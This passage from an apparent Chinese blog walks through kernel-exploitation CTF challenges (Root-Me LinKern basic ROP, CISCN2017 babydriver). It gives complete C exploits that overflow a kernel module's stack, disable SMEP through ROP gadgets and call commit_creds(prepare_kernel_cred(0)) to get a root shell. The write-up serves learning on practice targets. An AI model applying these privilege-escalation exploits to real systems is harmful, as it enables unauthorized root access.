class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Get_shell[<span class="number">20</span>] ; </span><br><span class="line">    mmap(<span class="number">0</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/tostring"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,<span class="string">"**********S"</span>,<span class="number">11</span>);</span><br><span class="line">    <span class="built_in">read</span>(fd,Get_shell,<span class="keyword">sizeof</span>(Get_shell));</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210604174655495.png" alt="image-20210604174655495"></p>
<h5 id="调试信息-1"><a href="#调试信息-1" class="headerlink" title="调试信息"></a>调试信息</h5><p><img src="/2021/06/05/kernel-study/image-20210604144933474.png" alt="image-20210604144933474"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file tostring.ko 0xC8824000 -s .data 0xC88247E0 -s .bss 0xC8824A80</span><br></pre></td></tr></table></figure>

<h3 id="3-Root-Me-LinKern-x86-basic-ROP"><a href="#3-Root-Me-LinKern-x86-basic-ROP" class="headerlink" title="3.[Root-Me]LinKern x86 - basic ROP"></a>3.[Root-Me]LinKern x86 - basic ROP</h3><h4 id="下载文件-2"><a href="#下载文件-2" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="https://www.root-me.org/en/Challenges/App-System/LinKern-x86-basic-ROP" target="_blank" rel="noopener">下载地址</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2223 app-systeme-ch39@challenge03.root-me.org </span><br><span class="line">密码:	app-systeme-ch39</span><br></pre></td></tr></table></figure>

<p>拷贝文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2223 app-systeme-ch39@challenge03.root-me.org:/challenge/app-systeme/ch39/* .</span><br><span class="line">密码:	app-systeme-ch39</span><br></pre></td></tr></table></figure>

<h4 id="预备"><a href="#预备" class="headerlink" title="预备"></a>预备</h4><ol>
<li><p>解压img的脚本first.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">mv initramfs.img initramfs.img.gz</span><br><span class="line">gunzip initramfs.img.gz</span><br><span class="line">mkdir initramfs</span><br><span class="line">cd initramfs</span><br><span class="line">cpio -idvm &lt; ../initramfs.img</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译c文件并放入img，启动qemu的脚本second.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">gcc -m32 -static -o exp exp.c</span><br><span class="line">cp exp.c initramfs</span><br><span class="line">cp exp initramfs</span><br><span class="line">cd initramfs</span><br><span class="line">find . | cpio -H newc -o &gt; ../initramfs.img</span><br><span class="line">cd ..</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>3.调试模块基址</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file ./initramfs/lib/modules/4.10.3/rootme/ch39.ko 0xc8824000 -s .bss 0xc8824440 -s .data 0xc88241a0</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210604203258087.png" alt="image-20210604203258087"></p>
<p>4.启动文件start.sh</p>
<blockquote>
<p>根据隐藏文件改编</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">app-systeme-ch39@challenge03:~$ cat ._start_vm </span><br><span class="line"><span class="comment">#!/bin/bash -p</span></span><br><span class="line"></span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">CHALLPATH=/challenge/app-systeme/ch39</span><br><span class="line"></span><br><span class="line">STTY=$(stty -g)</span><br><span class="line">stty intr ^-</span><br><span class="line"></span><br><span class="line">TEMP=$(mktemp -d)</span><br><span class="line">chgrp app-systeme-ch39 <span class="variable">$&#123;TEMP&#125;</span></span><br><span class="line">chmod 770 <span class="variable">$&#123;TEMP&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"A share will be available: host:<span class="variable">$&#123;TEMP&#125;</span> -&gt; guest:/mnt/share"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Launching the vulnerable machine..."</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line"> -m 32M \</span><br><span class="line"> -cpu kvm64,+smep,check \</span><br><span class="line"> -nographic \</span><br><span class="line"> -kernel <span class="variable">$CHALLPATH</span>/bzImage \</span><br><span class="line"> -append <span class="string">'console=ttyS0 loglevel=3 oops=panic panic=1'</span> \</span><br><span class="line"> -monitor /dev/null \</span><br><span class="line"> -initrd <span class="variable">$CHALLPATH</span>/initramfs.img \</span><br><span class="line"> -snapshot \</span><br><span class="line"> -hda <span class="variable">$CHALLPATH</span>/passwd.img \</span><br><span class="line"> -fsdev <span class="built_in">local</span>,id=exp1,path=<span class="variable">$&#123;TEMP&#125;</span>,security_model=mapped -device virtio-9p-pci,fsdev=exp1,mount_tag=rootme</span><br><span class="line"></span><br><span class="line">rm -rf <span class="string">"<span class="variable">$&#123;TEMP&#125;</span>"</span> 2&gt; /dev/null</span><br><span class="line">stty <span class="string">"<span class="variable">$&#123;STTY&#125;</span>"</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -s \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-append nokaslr \</span><br><span class="line">-initrd initramfs.img \</span><br><span class="line">-fsdev local,security_model&#x3D;passthrough,id&#x3D;fsdev-fs0,path&#x3D;&#x2F;home&#x2F;winter&#x2F;basicrop \</span><br><span class="line">-device virtio-9p-pci,id&#x3D;fs0,fsdev&#x3D;fsdev-fs0,mount_tag&#x3D;rootme \</span><br><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>

<p>可以看到开启了smep保护，即不能内核态不能执行用户态代码。</p>
<p><img src="/2021/06/05/kernel-study/image-20210604204333432.png" alt="image-20210604204333432"></p>
<h4 id="分析init文件-1"><a href="#分析init文件-1" class="headerlink" title="分析init文件"></a>分析init文件</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /passwd</span><br><span class="line">mount -t ext2 -o ro /dev/sda /passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># share</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /mnt/share</span><br><span class="line">mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync</span><br><span class="line">chmod 777 /mnt/share/</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># module</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#这次没有关闭MMAP_MIN_ADDR，也就是将限制mmap映射的最低内存地址</span></span><br><span class="line">insmod /lib/modules/*/rootme/*.ko</span><br><span class="line">chmod 666 /dev/bof</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">export ENV=/etc/profile</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"> </span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /dev</span><br><span class="line"> </span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>这次没有关闭MMAP_MIN_ADDR，也就是将限制mmap映射的最低内存地址</p>
<h4 id="分析LKMs文件-2"><a href="#分析LKMs文件-2" class="headerlink" title="分析LKMs文件"></a>分析LKMs文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/basicrop/initramfs/lib/modules/4.10.3/rootme$ file ch39.ko </span><br><span class="line">ch39.ko: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), BuildID[sha1]=c713ac86971c4a5d343a2537a18a950af493c44d, not stripped</span><br><span class="line">winter@ubuntu:~/basicrop/initramfs/lib/modules/4.10.3/rootme$ checksec ch39.ko </span><br><span class="line">[*] '/home/winter/basicrop/initramfs/lib/modules/4.10.3/rootme/ch39.ko'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>这次没有源码，主要分析ida中的ko文件</p>
<p><img src="/2021/06/05/kernel-study/image-20210604230215674.png" alt="image-20210604230215674"></p>
<p>主要分析write函数</p>
<ol>
<li>判断size不为0</li>
<li>将Buf里的长度len的数据循环拷贝到栈上长度0x24的栈上</li>
<li>…</li>
</ol>
<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>因为存在栈溢出，所以如果填充40个垃圾数据后，就可以覆盖到eip了</p>
<h5 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h5><blockquote>
<p>cyclic 40=&gt;生成40个字符</p>
<p>然后返回地址填成0xdeadbeef</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Payload[<span class="number">0x100</span>] = <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xEF\xBE\xAD\xDE"</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/bof"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,Payload,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210604210532727.png" alt="image-20210604210532727"></p>
<p><img src="/2021/06/05/kernel-study/image-20210604210519934.png" alt="image-20210604210519934"></p>
<p><img src="/2021/06/05/kernel-study/image-20210605000529882.png" alt="image-20210605000529882"></p>
<p>正如我们所想，eip的值为0xdeadbeef然后就挂了。</p>
<p>可以成功控制eip</p>
<h5 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h5><p>要绕过smep检验，将cr4的第20位设为0，通过两个gadget实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xc10174fc : pop eax ; ret</span><br><span class="line">0xc1045053 : mov cr4, eax ; pop ebp ; ret</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Payload[<span class="number">0x100</span>] = <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xFC\x74\x01\xC1\xD0\x06\x00\x00\x53\x50\x04\xC1\x00\x00\x00\x00\xEF\xBE\xAD\xDE"</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/bof"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,Payload,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210605000952674.png" alt="image-20210605000952674"></p>
<p>在test2的c后面加上提权的shellcode，即可得到最后的exp</p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> receive[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs;popl tf+4;"</span>    <span class="comment">//set cs</span></span><br><span class="line">        <span class="string">"pushfl;popl tf+8;"</span>       <span class="comment">//set eflags</span></span><br><span class="line">        <span class="string">"pushl %esp;popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss;popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;get_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC10711F0</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xC1070E80</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">          <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Get_shell[<span class="number">5</span>];</span><br><span class="line">    init_tf_work();</span><br><span class="line">    *((<span class="keyword">void</span>**)(Get_shell)) = &amp;payload;</span><br><span class="line">    <span class="keyword">char</span> Payload[<span class="number">0x100</span>] = <span class="string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xFC\x74\x01\xC1\xD0\x06\x00\x00\x53\x50\x04\xC1\x00\x00\x00\x00"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>,j = <span class="number">56</span>;i &lt; <span class="number">4</span>;i++,j++)&#123;</span><br><span class="line">        Payload[j] = Get_shell[i];<span class="comment">//绕过smep后加上提权和get shell</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/bof"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,Payload,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210605001430795.png" alt="image-20210605001430795"></p>
<h3 id="4-CISCN2017-–-babydriver"><a href="#4-CISCN2017-–-babydriver" class="headerlink" title="4.CISCN2017 – babydriver"></a>4.CISCN2017 – babydriver</h3><h4 id="下载文件-3"><a href="#下载文件-3" class="headerlink" title="下载文件"></a>下载文件</h4><p>wiki中有这道，可以上github的ctf-challenge中下载</p>
<p><a href="babydriver.tar">附件</a></p>
<p>一共给了三个文件：boot.sh、bzImage和rootfs.cpio</p>
<ul>
<li><p>boot.sh：是启动文件，开启了kvm（虚拟化），但虚拟机中的Ubuntu再启动虚拟化很麻烦，因此可以直接修改启动指令为如下指令，启动脚本start.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -s \</span><br><span class="line">-initrd rootfs.cpio \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/winter/babydriver \</span><br><span class="line">-device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme \</span><br><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
</li>
<li><p>bzImage：未压缩的文件系统</p>
</li>
<li><p>rootfs.cpio：内核镜像</p>
</li>
</ul>
<h4 id="预备-1"><a href="#预备-1" class="headerlink" title="预备"></a>预备</h4><ol>
<li><p>解压内核镜像脚本，decompression.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">mv rootfs.cpio rootfs.cpio.gz</span><br><span class="line">gunzip rootfs.cpio.gz</span><br><span class="line">mkdir rootfs</span><br><span class="line">cd rootfs</span><br><span class="line">cpio -idvm &lt; ../rootfs.cpio</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译c文件并放入img，启动qemu的脚本input_file.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">gcc -static -o exp exp.c</span><br><span class="line">cp exp.c rootfs</span><br><span class="line">cp exp rootfs</span><br><span class="line">cd rootfs</span><br><span class="line">find . | cpio -H newc -o &gt; ../rootfs.cpio</span><br><span class="line">cd ..</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>调试模块基址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file ./rootfs/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000 -s .bss 0xffffffffc0002000 -s .data 0xffffffffc0002440</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210605202802017.png" alt="image-20210605202802017"></p>
</li>
<li><p>启动文件start.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -s \</span><br><span class="line">-initrd rootfs.cpio \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/winter/babydriver \</span><br><span class="line">-device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme \</span><br><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>

<p>开启了smep保护</p>
<p><img src="/2021/06/05/kernel-study/image-20210605204630220.png" alt="image-20210605204630220"></p>
</li>
<li><p>提权地址</p>
<p><img src="/2021/06/05/kernel-study/image-20210605205107457.png" alt="image-20210605205107457"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff810a1420</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>LKMs文件</p>
